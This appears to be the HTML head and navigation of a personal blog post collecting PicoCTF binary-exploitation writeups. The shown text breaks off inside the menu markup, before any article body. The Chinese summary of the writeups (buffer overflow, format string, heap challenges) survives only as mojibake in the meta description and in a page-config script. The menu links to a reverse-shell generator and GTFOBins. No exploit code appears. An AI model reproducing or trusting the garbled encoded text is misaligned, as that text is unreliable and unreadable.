<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>All-in-One PicoCTF Writeups: Pwn (Binary Exploitation) | S1l3ntC0nquer</title><meta name="keywords" content="PicoCTF,Cybersecurity"><meta name="author" content="S1l3ntC0nquer"><meta name="copyright" content="S1l3ntC0nquer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)"><meta name="application-name" content="All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)"><meta property="og:url" content="https://s1l3ntc0nquer.github.io/web/posts/6526bdbd/index.html"><meta property="og:site_name" content="S1l3ntC0nquer"><meta property="og:description" content="å‰è¨€ å…¶å¯¦å¥½åƒä¹Ÿæ²’ä»€éº¼å¥½è¬›å‰è¨€çš„ï¼Œä½†å°±æ˜¯ä¸æƒ³è¦ä¸€é–‹å§‹å°±æ˜¯é¡Œç›®åˆ†é¡ï¼Œæ‰€ä»¥é‚„æ˜¯æ”¾äº†å€‹å‰è¨€ XDã€‚ è‡ªå·±åœ¨åˆ· PicoCTF çš„æ™‚å€™å¸¸å¸¸ç™¼ç¾ï¼Œå¹¾ä¹æ‰€æœ‰çš„ writeup éƒ½æ˜¯è‹±æ–‡çš„å±…å¤šï¼Œæ‰€ä»¥æƒ³èªªä¾†å¯«å€‹å®Œæ•´ä¸€é»çš„ä¸­æ–‡ç‰ˆï¼ç¸½ä¹‹å‘¢é€™è£¡å°±æ˜¯æœƒç›¡é‡å½™æ•´æ‰€æœ‰çš„ picoCTF çš„é¡Œç›®åœ¨é€™é‚Šï¼ˆä½†æ˜¯å› ç‚ºå·²ç¶“å¯«äº† 60 é¡Œ"><meta property="og:locale" content="en"><meta property="og:image" content="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta property="article:author" content="S1l3ntC0nquer"><meta property="article:tag" content="S1l3ntC0nquer, XploitOverlord, S1l3ntC0nquer universe, S1l3ntC0nquer Blog, Blog, CTF, S1l3ntC0nquer hacker, hacker, Cybersecurity, Hacker, Hacker, Programming, Programmer, hacker-blog, hacker-blog, Programming Diary, Hacker, hacker-blog, Kalpesh Solanki"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"><meta name="description" content="å‰è¨€ å…¶å¯¦å¥½åƒä¹Ÿæ²’ä»€éº¼å¥½è¬›å‰è¨€çš„ï¼Œä½†å°±æ˜¯ä¸æƒ³è¦ä¸€é–‹å§‹å°±æ˜¯é¡Œç›®åˆ†é¡ï¼Œæ‰€ä»¥é‚„æ˜¯æ”¾äº†å€‹å‰è¨€ XDã€‚ è‡ªå·±åœ¨åˆ· PicoCTF çš„æ™‚å€™å¸¸å¸¸ç™¼ç¾ï¼Œå¹¾ä¹æ‰€æœ‰çš„ writeup éƒ½æ˜¯è‹±æ–‡çš„å±…å¤šï¼Œæ‰€ä»¥æƒ³èªªä¾†å¯«å€‹å®Œæ•´ä¸€é»çš„ä¸­æ–‡ç‰ˆï¼ç¸½ä¹‹å‘¢é€™è£¡å°±æ˜¯æœƒç›¡é‡å½™æ•´æ‰€æœ‰çš„ picoCTF çš„é¡Œç›®åœ¨é€™é‚Šï¼ˆä½†æ˜¯å› ç‚ºå·²ç¶“å¯«äº† 60 é¡Œ"><link rel="shortcut icon" href="/web/assets/favicon.ico"><link rel="canonical" href="https://s1l3ntc0nquer.github.io/web/posts/6526bdbd/"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="xxx"><meta name="baidu-site-verification" content="code-xxx"><meta name="msvalidate.01" content="xxx"><link rel="stylesheet" href="/web/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload='this.media="all"'><script async src="https://www.googletagmanager.com/gtag/js?id=G-PM5RRNPNEB"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-PM5RRNPNEB")</script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron&amp;display=swap" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG={linkPageTop:{enable:!0,title:"Connect with others",addFriendPlaceholder:"Nicknameï¼š\nSite URLï¼š\nAvatar URLï¼š\nDescriptionï¼š"},peoplecanvas:void 0,postHeadAiDescription:{enable:!0,gptName:"S1l3ntC0nquer",mode:"local",switchBtn:!1,btnLink:"https://afdian.net/item/886a79d4db6711eda42a52540025c377",randomNum:3,basicWordCount:1e3,key:"xxxx",Referer:"https://xx.xx/"},diytitle:void 0,LA51:void 0,greetingBox:void 0,twikooEnvId:"https://comments.S1l3ntC0nquer.in/",commentBarrageConfig:{enable:!0,maxBarrage:1,barrageTime:8e3,accessToken:"8e5a0f02d2d6b6604e700a856bf586e7",mailMd5:"25de757f9696b310771b584e7bf5b238"},root:"/web/",preloader:{source:3},friends_vue_info:void 0,navMusic:!0,mainTone:{mode:"api",api:"https://img2color.S1l3ntC0nquer.in/api?img=",cover_change:!0},authorStatus:{skills:["Hacker","CTFer","Developer","Programmer",3345]},algolia:void 0,localSearch:{path:"/web/search.xml",preload:!0,languages:{hits_empty:"We didn't find any results for the search: ${query}"}},translate:{defaultEncoding:1,translateDelay:0},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:3345},copy:{success:"Copy successfully",error:"Copy error",noSupport:"The browser does not support"},relativeDate:{homepage:!1,simplehomepage:!0,post:!1},runtime:"days",date_suffix:{just:"Just",min:"minutes ago",hour:"hours ago",day:"days ago",month:"months ago"},copyright:{copy:!0,copyrightEbable:!1,limitCount:50,languages:{author:"Author: S1l3ntC0nquer",link:"Link: ",source:"Source: S1l3ntC0nquer",info:"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.",copySuccess:"Copy success, copy and reprint please mark the address of this article"}},lightbox:"fancybox",Snackbar:{chs_to_cht:"Traditional Gujarati Activated Manually",cht_to_chs:"Simplified Gujarati Activated Manually",day_to_night:"Dark Mode Activated Manually",night_to_day:"Light Mode Activated Manually",bgLight:"#425AEF",bgDark:"#1f1f1f",position:"top-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2.1.2/dist/fjGallery.min.css"}},isPhotoFigcaption:!0,islazyload:!0,isAnchor:!1,shortcutKey:void 0,autoDarkmode:!0}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={configTitle:"S1l3ntC0nquer",title:"All-in-One PicoCTF Writeups: Pwn (Binary Exploitation)",postAI:"",pageFillDescription:"å‰è¨€, Local Target, VNE, buffer overflow 0, buffer overflow 1, buffer overflow 2, two-sum, format string 0, format string 1, heap 0, heap 1å‰è¨€å…¶å¯¦å¥½åƒä¹Ÿæ²’ä»€éº¼å¥½è¬›å‰è¨€çš„ä½†å°±æ˜¯ä¸æƒ³è¦ä¸€é–‹å§‹å°±æ˜¯é¡Œç›®åˆ†é¡æ‰€ä»¥é‚„æ˜¯æ”¾äº†å€‹å‰è¨€è‡ªå·±åœ¨åˆ·çš„æ™‚å€™å¸¸å¸¸ç™¼ç¾å¹¾ä¹æ‰€æœ‰çš„éƒ½æ˜¯è‹±æ–‡çš„å±…å¤šæ‰€ä»¥æƒ³èªªä¾†å¯«å€‹å®Œæ•´ä¸€é»çš„ä¸­æ–‡ç‰ˆç¸½ä¹‹å‘¢é€™è£¡å°±æ˜¯æœƒç›¡é‡å½™æ•´æ‰€æœ‰çš„çš„é¡Œç›®åœ¨é€™é‚Šä½†æ˜¯å› ç‚ºå·²ç¶“å¯«äº†é¡Œå·¦å³æ‰é–‹å§‹æ‰“ç®—ä¾†å¯«æ‰€ä»¥å¯èƒ½å‰é¢çš„éƒ¨åˆ†æœƒç­‰å…¶ä»–éƒ½å¯«å®Œå†ä¾†è£œå¦‚æœæœ‰éœ€è¦å°±å¯ä»¥ç›´æ¥ä¾†é€™é‚Šçœ‹æ‰€æœ‰çš„å°±é€™æ¨£å•¦å¸Œæœ›èƒ½å¹«å¿™åˆ°ä½ é€™é¡Œçµ¦äº†ä¸€å€‹å¯åŸ·è¡Œçš„æª”æ¡ˆå’Œèªè¨€çš„ä»£ç¢¼å…ˆä¾†åˆ†æä¸€ä¸‹ä»–çš„ä»£ç¢¼å§ç•¶ä½¿ç”¨é€£ç·šåˆ°é¡Œç›®çš„æ™‚å€™æœƒå¦‚åŒä¸‹é¢ä¸€èˆ¬åˆ†æä»£ç¢¼å®£å‘Šäº†ä¸€å€‹é•·åº¦ç‚ºçš„å­—å…ƒé™£åˆ—å„²å­˜ä½¿ç”¨è€…è¼¸å…¥ç²å–ä½¿ç”¨è€…è¼¸å…¥ç”±æ–¼å‡½æ•¸ä¸æª¢æŸ¥è¼¸å…¥çš„é•·åº¦ä½¿ç”¨è€…å¯ä»¥è¼¸å…¥è¶…éå€‹å­—å…ƒå±é™©å‡½æ•°å‡ ç§å®Œç¾çš„æ›¿ä»£æ–¹æ³•ä½ å¯èƒ½è¿˜ä¸çŸ¥é“çš„å®£å‘Šä¸¦åˆå§‹åŒ–è®Šæ•¸æ‹¿åˆ°çš„æ¢ä»¶æ˜¯è¦è®“çš„å€¼ç‚ºé€™é‚Šæˆ‘å€‘å¯ä»¥ç”¨æŒ‡ä»¤é€²å…¥çš„æ‰‹å†Šé çœ‹ä¸€ä¸‹ä»–çš„å€å¡Šäº†è§£åˆ°åº•å±éšªåœ¨å“ªè£¡æ”»æ“Šé¦–å…ˆå…ˆæª¢æŸ¥ä¸€ä¸‹ä»–æœ‰æ²’æœ‰ä»»ä½•ä¿è­·æ©Ÿåˆ¶ä»–æ²’æœ‰ä¹Ÿæ²’æœ‰å°±æ­£å¸¸åšå°±å¯ä»¥äº†å› ç‚ºå’Œéƒ½æ˜¯å€åŸŸè®Šæ•¸æ‰€ä»¥æœƒå­˜åœ¨ä¸­ä¸¦ä¸”å› ç‚ºæ˜¯å…ˆå®£å‘Šç·Šæ¥è‘—å®£å‘Šæ‰€ä»¥åœ¨ä¸­æœƒåƒä¸‹é¢é€™æ¨£æœ€å¾Œè©¦å‡ºä¾†çš„æ˜¯å€‹å­—å…ƒåŠ ä¸Šä¸€å€‹å¤§å¯«çš„å› ç‚ºä½†æ˜¯åœ¨é€™è£¡æˆ‘æœ‰é»ä¸ç†è§£ç‚ºç”šéº¼å‰é¢æ˜¯å€‹å¡«å……çŒœæ¸¬æ˜¯è·Ÿä¸­é–“æœ‰ä¹‹é¡çš„æ±è¥¿å¦‚æœæœ‰äººçŸ¥é“çš„è©±å†éº»ç…©è·Ÿæˆ‘è§£é‡‹ä¸€ä¸‹æ„Ÿè¬äº†ç¸½ä¹‹é‚„æ˜¯æ‹¿åˆ°å•¦é€™é¡Œå…ˆé€£ä¸Šå»å¾Œç™¼ç¾é¡Œç›®æœ‰èªªçµ¦äº†ä¸€å€‹å«åšçš„ä¾†åŸ·è¡Œå‘½ä»¤é¡Œç›®æ˜¯é€™æ¨£èªªçš„ä½†ç•¶æˆ‘å€‘å˜—è©¦åŸ·è¡Œå¾Œæœƒç™¼ç¾ä»–èªªæ‰€ä»¥æˆ‘å€‘çŸ¥é“è¦å»è¨­ç½®ç’°å¢ƒè®Šæ•¸åŸä¾†é€™é¡Œç›®çš„åå­—å°±æ˜¯çš„å€’éä¾†é‚£å…ˆå˜—è©¦å°‡ä»–è¨­ç½®ç‚ºèªªçš„ç›®éŒ„è©¦è©¦çœ‹ç™¼ç¾ä¸‹é¢æœ‰å€‹é‚£æˆ‘å€‘è¦å¦‚ä½•è®€å–åˆ°ä»–å‘¢åˆ°é€™é‚Šæˆ‘å€‘å¤§æ¦‚å¯ä»¥çŒœæ¸¬é€™é¡Œå…¶å¯¦æ˜¯ä¸€å€‹é¡Œæˆ‘çŒœæ¸¬ä»–èƒŒå¾Œçš„ç¨‹å¼é‚è¼¯å°±æ˜¯å»åŸ·è¡Œé¡ä¼¼æ–¼ä¹‹é¡çš„æ±è¥¿æ‰€ä»¥æŠŠç’°å¢ƒè®Šæ•¸æ”¹ç‚ºå¦‚ä¸‹æ”¹å®Œå¾Œå†å»åŸ·è¡Œå°±å‡ºä¾†äº†é€™é¡Œä¹Ÿæ˜¯çµ¦äº†å¯åŸ·è¡Œæ–‡ä»¶å’Œæºä»£ç¢¼å…ˆä¸‹è¼‰ä¸‹ä¾†çœ‹çœ‹é€™è£¡æœƒå‡ºé€™è£¡æ˜¯é—œéµå‡½æ•¸çš„åç¨±ä»£è¡¨è‘—ç•¶é‹è¡Œæ™‚å‡ºç¾æ™‚æœƒèª¿ç”¨å‡½æ•¸åˆ†æä»£ç¢¼æ˜¯è¦è§¸ç™¼å‡½å¼è£¡é¢çš„å®£å‘Šç‚ºå€‹å­—å…ƒçš„å¤§å°ä¹Ÿå°±æ˜¯å€‹ç•¶è¼¸å…¥çš„å…§å®¹è¶…éå€‹çš„æ™‚å€™è§¸ç™¼éŒ¯èª¤é€™é‚Šæˆ‘å€‘å¯ä»¥å†ä¾†çœ‹ä¸€ä¸‹é™¤äº†ä»¥å¤–çš„å±éšªå‡½å¼ä¹Ÿå°±æ˜¯æ‰‹å†Šè£¡é¢ä¹Ÿå¯«äº†è¦è² èµ·è²¬ä»»æŒ‡æ´¾ä¸€å€‹è¶³å¤ å¤§çš„ç©ºé–“çµ¦çš„æ”»æ“Šæ‰€ä»¥æˆ‘å€‘çŸ¥é“åœ¨é€™è£¡åªè¦è¼¸å…¥å¾ˆé•·çš„å­—ä¸²å°±æœƒé€ æˆå‡ºéŒ¯ä¸¦å¾—åˆ°é‚£å°±ä¾†è©¦è©¦çœ‹å§è€æ¨£å­ä¸€å€‹æª”æ¡ˆä¸€å€‹æºç¢¼å…ˆçœ‹ä¸€ä¸‹ä»£ç¢¼çœ‹èµ·ä¾†æ˜¯å€‹çš„é¡Œç›®é‚£å°±ç›´æ¥é–‹å§‹å§å…ˆç”¨æ‰¾ä¸€ä¸‹æ‰¾åˆ°ä»–çš„ç‚ºå¾Œå†çœ‹ä¸€ä¸‹çš„åœ°å€æ‰¾åˆ°äº†å®ƒçš„åœ°å€æ˜¯é‚£å°±é–‹å§‹æ§‹é€ å§å’Œå‰å…©é¡Œä¸€æ¨£å…ˆçœ‹çœ‹ä»£ç¢¼é€™æ¬¡å’Œå‰é¢é‚£é¡Œå·®ä¸å¤šä¹Ÿæ˜¯å€‹ä½†æ˜¯å®ƒå¤šäº†ä¸€å€‹æª¢æŸ¥æ¢ä»¶è¦åˆ¤æ–·å’Œçš„å€¼æ˜¯å¦ç‚ºå’Œæ‰€ä»¥åœ¨æ§‹é€ çš„æ™‚å€™è¦è¨˜å¾—æŠŠé€™å…©å€‹çš„å€¼ä¸²æ¥ä¸Šå»æ¥ä¸‹ä¾†å°±é–‹å§‹ç·¨å¯«å§è‡³æ–¼ç‚ºç”šéº¼ä¸­é–“è¦å¤šåŠ ä¸€å€‹æˆ‘ç›´æ¥å¯«åœ¨è¨»è§£ä¸­äº†å…ˆçœ‹é¡Œç›®çš„ä»£ç¢¼å–®ä¾†èªªå°±æ˜¯è¦è¼¸å…¥å…©å€‹æ•¸å­—è®“ä»–ç›¸åŠ å¾Œæœƒæˆ‘å€‘çŸ¥é“ä¸€å€‹çš„ä¸Šé™æ˜¯ä¹Ÿå°±æ˜¯æ‰€ä»¥è®“é€™å€‹æ•¸å­—å†åŠ ä¸Šå°±æœƒåˆ©ç”¨é€™å€‹åŸç†æˆ‘å€‘ç›´æ¥ç”¨é€£æ¥åˆ°é¡Œç›®è¼¸å…¥å’Œç²å¾—å…ˆé€£æ¥åˆ°é¡Œç›®ç„¶å¾Œçœ‹ä¸€ä¸‹é¡Œç›®é•·æ€æ¨£æˆ‘åœ¨æ¸¬è©¦é¡Œç›®æ¼æ´çš„æ™‚å€™è¼¸å…¥äº†ä¸€å †çµæœå°±ç›´æ¥å¾—åˆ°äº†ä¾†çœ‹çœ‹é¡Œç›®çš„å¯ä»¥æ˜é¡¯åœ°çœ‹åˆ°åœ¨ç¬¬è¡Œé‚£é‚Šçš„æ˜¯æ²’æœ‰åŠ ä¸Šæ ¼å¼åŒ–å­—ç¬¦çš„æ‰€ä»¥é€™é‚Šæœ‰ä¸€å€‹å¾ˆæ˜é¡¯çš„æˆ‘å€‘ç”¨é€£æ¥é¡Œç›®çœ‹çœ‹é€£ä¸Šé¡Œç›®å¾Œç™¼ç¾ä»–èªªæ‰€ä»¥æˆ‘å€‘å˜—è©¦è¼¸å…¥å¾Œç™¼ç¾ä»–æœƒè¼¸å‡ºä¸€å€‹åå…­é€²ä½çš„æ±è¥¿ä»¥ä¸‹æ˜¯é¡Œç›®çš„è¼¸å‡ºé€™çœ‹èµ·ä¾†å¯ä»¥æŠŠå®ƒè½‰å›å­—ä¸²ä¸¦ä¸”å¦‚æœå¤šè¼¸å…¥å¹¾å€‹æ‡‰è©²å°±èƒ½æŠŠçµ¦å‡ºä¾†æˆ‘å¯«äº†ä¸€å€‹å»å˜—è©¦ç²å–åœ¨è…³æœ¬ä¸­ä¹‹æ‰€ä»¥è¦æŠŠæ¯ä¸€æ®µåå…­é€²ä½è½‰å›çš„å­—ä¸²å‰å¾Œç¿»è½‰æ˜¯å› ç‚ºé¡Œç›®å‰›å‰›æœ‰èªªæ‰€ä»¥æ¨æ¸¬ä»–æ‡‰è©²æ˜¯åè‘—éä¾†è¼¸å‡ºçš„å¦‚ä¸‹æœç„¶åŸ·è¡Œå¾Œå°±å¯ä»¥çœ‹åˆ°å•¦å…ˆæŠŠé¡Œç›®çµ¦çš„ä¸‹è¼‰ä¸‹ä¾†çœ‹çœ‹ç™¼ç¾ä»–å°±æ˜¯è¦æƒ³è¾¦æ³•å»è“‹æ‰ä¸€å€‹å«åšçš„è®Šæ•¸æ‰€ä»¥æˆ‘å€‘å…ˆé€£æ¥åˆ°é¡Œç›®çœ‹çœ‹å§é€£æ¥åˆ°é¡Œç›®å¾Œæˆ‘å€‘å¯ä»¥çœ‹è¦‹å’Œä¸­é–“éš”äº†å€‹ä¹Ÿå°±æ˜¯åé€²ä½ä¸­çš„é€™ä»£è¡¨æˆ‘å€‘è¦å¯«å…¥å€‹åˆ°è£¡é¢å› ç‚ºå¾ˆå–®å°±ä¹Ÿä¸å¯«äº†ç›´æ¥æ‰‹å‹•è¼¸å…¥å§é¦–å…ˆè¼¸å…¥ç„¶å¾Œè¼¸å…¥å€‹å­—å…ƒç„¶å¾Œè¼¸å…¥å®Œå¾Œå†è¼¸å…¥æŠŠæ‰“å°å‡ºä¾†çœ‹çœ‹å°±å¯ä»¥çœ‹åˆ°åŸæœ¬çš„åœ°æ–¹è¢«è¦†è“‹æ‰äº†è¦†è“‹æ‰å¾Œå†é¸æŠŠæ‰“å°å‡ºä¾†å°±å¥½å•¦å…ˆçœ‹é¡Œç›®çµ¦çš„ä»£ç¢¼è¦è´çš„æ¢ä»¶æ˜¯è®“ç­‰æ–¼å› ç‚ºç›¸ç­‰çš„è©±å›å‚³æ‰€ä»¥å’Œä¸Šä¸€é¡ŒåŸºæœ¬ä¸Šä¸€æ¨£åªè¦æŠŠè¼¸å…¥å€‹å¾Œçš„æ±è¥¿æ›æˆå°±å¯ä»¥äº†å¦‚ä¸‹é€™æ¨£å°±å¾—åˆ°å•¦",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-12-15 16:00:36",postMainColor:"#040404"}</script><noscript><style type="text/css">#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:(e,t,a)=>{if(0===a)return;const o={value:t,expiry:Date.now()+864e5*a};localStorage.setItem(e,JSON.stringify(o))},get:e=>{const t=localStorage.getItem(e);if(!t)return;const a=JSON.parse(t);if(!(Date.now()>a.expiry))return a.value;localStorage.removeItem(e)}},e.getScript=(e,t={})=>new Promise((a,o)=>{const c=document.createElement("script");c.src=e,c.async=!0,c.onerror=o,c.onload=c.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(c.onload=c.onreadystatechange=null,a())},Object.keys(t).forEach(e=>{c.setAttribute(e,t[e])}),document.head.appendChild(c)}),e.getCSS=(e,t=!1)=>new Promise((a,o)=>{const c=document.createElement("link");c.rel="stylesheet",c.href=e,t&&(c.id=t),c.onerror=o,c.onload=c.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(c.onload=c.onreadystatechange=null,a())},document.head.appendChild(c)}),e.activateDarkMode=()=>{document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#18171d")},e.activateLightMode=()=>{document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#f7f9fe")};const t=saveToLocal.get("theme"),a=window.matchMedia("(prefers-color-scheme: dark)").matches,o=window.matchMedia("(prefers-color-scheme: light)").matches,c=window.matchMedia("(prefers-color-scheme: no-preference)").matches,n=!a&&!o&&!c;if(void 0===t){if(o)activateLightMode();else if(a)activateDarkMode();else if(c||n){const e=(new Date).getHours();e<=6||e>=18?activateDarkMode():activateLightMode()}window.matchMedia("(prefers-color-scheme: dark)").addListener(e=>{void 0===saveToLocal.get("theme")&&(e.matches?activateDarkMode():activateLightMode())})}else"light"===t?activateLightMode():activateDarkMode();const d=saveToLocal.get("aside-status");void 0!==d&&("hide"===d?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="S1l3ntC0nquer" data-description="Support me on Buy me a coffee!" data-message="Hackers need COFFEE â˜•" data-color="var(--anzhiyu-theme)" data-position="Right" data-x_margin="18" data-y_margin="18"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/web/atom.xml" title="S1l3ntC0nquer" type="application/atom+xml">
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="Loading" src="/web/assets/me.png"><div class="loading-image-dot"></div></div></div><script>const preloader={endLoading:()=>{document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",()=>{preloader.endLoading()}),setTimeout((function(){preloader.endLoading()}),1e4),document.addEventListener("pjax:send",()=>{preloader.initLoading()}),document.addEventListener("pjax:complete",()=>{preloader.endLoading()})</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.min.css"><script async src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">Contact</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/S1l3ntC0nquer" title="Github"><img class="back-menu-item-icon" src="/web/assets/github.png" alt="Github"><span class="back-menu-item-text">Github</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.instagram.com/xploitoverload?igsh=cnZ2M2hwamNtcjF1" title="Instagram"><img class="back-menu-item-icon" src="/web/assets/ig.png" alt="Instagram"><span class="back-menu-item-text">Instagram</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://www.linkedin.com/in/kalpesh11111/" title="LinkedIn"><img class="back-menu-item-icon" src="/web/assets/linkedin.png" alt="LinkedIn"><span class="back-menu-item-text">LinkedIn</span></a><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/web/assets/Resume.pdf" title="Resume"><img class="back-menu-item-icon" src="/web/assets/me.jpg" alt="Resume"><span class="back-menu-item-text">Resume</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Others</div><div class="back-menu-list"><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/web" title="Portfolio"><img class="back-menu-item-icon" src="/web/assets/me.jpg" alt="Portfolio"><span class="back-menu-item-text">Portfolio</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="http://sparkymodz.whf.bz" title="Admin"><img class="back-menu-item-icon" src="/web/assets/hacker.png" alt="Admin"><span class="back-menu-item-text">Admin</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">Useful Tools</div><div class="back-menu-list"><a class="back-menu-item" href="https://s1l3ntc0nquer.github.io/Revershell-Generator" title="RevShells"><img class="back-menu-item-icon" src="/web/assets/hacker.png" alt="RevShells"><span class="back-menu-item-text">RevShells</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ohmycv.app" title="OhMyCV"><img class="back-menu-item-icon" src="/web/assets/hacker.png" alt="OhMyCV"><span class="back-menu-item-text">OhMyCV</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://gtfobins.github.io/" title="GTFOBins"><img class="back-menu-item-icon" src="/web/assets/hacker.png" alt="GTFOBins"><span class="back-menu-item-text">GTFOBins</span></a></div></div></div></div><a id="site-name" href="/web/" accesskey="h"><div class="title">S1l3ntC0nquer</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Articles</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/archives/"><i class="fa-solid fa-file-zipper faa-tada"></i><span> Archives</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/categories/"><i class="fa-solid fa-icons faa-tada"></i><span> Categories</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/tags/"><i class="fa-solid fa-hashtag faa-tada"></i><span> Tags</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="fa-solid fa-dice faa-tada"></i><span> Random</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>My</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/assets/Resume.pdf"><i class="fa-solid fa-file faa-tada"></i><span> Resume</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/music/"><i class="fa-solid fa-music faa-tada"></i><span> Music bar</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/essay/"><i class="fa-solid fa-lightbulb faa-tada"></i><span> Life snippets</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/collect/"><i class="fa-solid fa-medal faa-tada"></i><span> Collections</span></a></li><li><a class="site-page child faa-parent animated-hover" target="_blank" rel="noopener" href="https://S1l3ntC0nquer.notion.site/Bullet-Journal-c79ab73909d94fa387d4b58e85d90494"><i class="fa-solid fa-clipboard-list faa-tada"></i><span> Notes</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>About</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/web/about/"><i class="fa-solid fa-id-badge faa-tada"></i><span> Whoami</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/web/subscribe/"><i class="fa-solid fa-bell faa-tada"></i><span> Subscribe</span></a></li><li><a class="site-page child faa-parent animated-hover" href="https://s1l3ntc0nquer.github.io/web/"><i class="fa-solid fa-user faa-tada"></i><span> Portfolio</span></a></li></ul></div></div></div><div id="nav-right"><div id="nav-naoDark"><div class="container"><div class="components"><div class="main-button"><div class="moon"></div><div class="moon"></div><div class="moon"></div></div><div class="daytime-backgrond"></div><div class="daytime-backgrond"></div><div class="daytime-backgrond"></div><div class="cloud"><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div><div class="cloud-son"></div></div><div class="cloud-light"><div class="cloud-son"></div><div 